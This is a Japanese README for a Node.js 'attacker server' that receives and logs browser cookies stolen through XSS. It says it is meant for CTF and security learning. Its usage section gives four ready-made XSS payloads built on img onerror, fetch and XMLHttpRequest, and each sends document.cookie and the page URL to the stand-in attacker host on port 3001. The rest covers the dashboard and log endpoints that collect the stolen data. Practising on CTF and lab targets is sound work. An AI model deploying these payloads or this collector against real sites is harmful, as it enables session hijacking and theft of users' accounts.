# 攻撃者サーバー (Attack Server)

XSS攻撃で盗取したCookieを受け取る攻撃者サーバーです。CTF学習目的で使用してください。

## ⚠️ 警告

**このサーバーは教育目的のみで使用してください。実際の攻撃に使用しないでください。**

## 機能

- Cookieを受け取るエンドポイント（GET/POST対応）
- 盗取されたCookieのダッシュボード表示
- ログファイルへの記録
- ログのクリア機能

## セットアップ

### 必要な環境
- Node.js (v14以上)
- npm

### インストール

```bash
npm install
```

### 起動

```bash
npm start
```

または

```bash
node server.js
```

サーバーはポート3001で起動します。

## 使用方法

### 1. サーバーにアクセス

ブラウザで `http://localhost:3001` にアクセスすると、ダッシュボードが表示されます。

### 2. XSSペイロードの例

以下のようなXSSペイロードを使用してCookieを盗取できます：

#### 方法1: imgタグを使用（最もシンプル）

```html
<img src=x onerror="this.src='http://攻撃者のIP:3001/steal?cookies='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href)">
```

#### 方法2: fetch APIを使用

```javascript
<script>
fetch('http://攻撃者のIP:3001/steal', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    cookies: document.cookie,
    url: window.location.href
  })
});
</script>
```

#### 方法3: XMLHttpRequestを使用

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://攻撃者のIP:3001/steal', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
  cookies: document.cookie,
  url: window.location.href
}));
</script>
```

#### 方法4: 短縮版（imgタグ）

```html
<img src="http://攻撃者のIP:3001/steal?cookies="+document.cookie>
```

### 3. 盗取されたCookieの確認

ダッシュボード（`http://localhost:3001`）で盗取されたCookieを確認できます。

ログファイルは `logs/stolen_cookies.log` に保存されます。

## エンドポイント

- `GET /` - ダッシュボード（盗取されたCookie一覧）
- `GET /steal?cookies=...` - Cookieを受け取る（GET）
- `POST /steal` - Cookieを受け取る（POST）
- `GET /logs` - ログファイルの内容を表示
- `POST /logs/clear` - ログをクリア

## 注意事項

- このサーバーはLAN内のIPアドレスでリッスンします
- 実際の攻撃に使用しないでください
- CTFやセキュリティ学習目的のみで使用してください
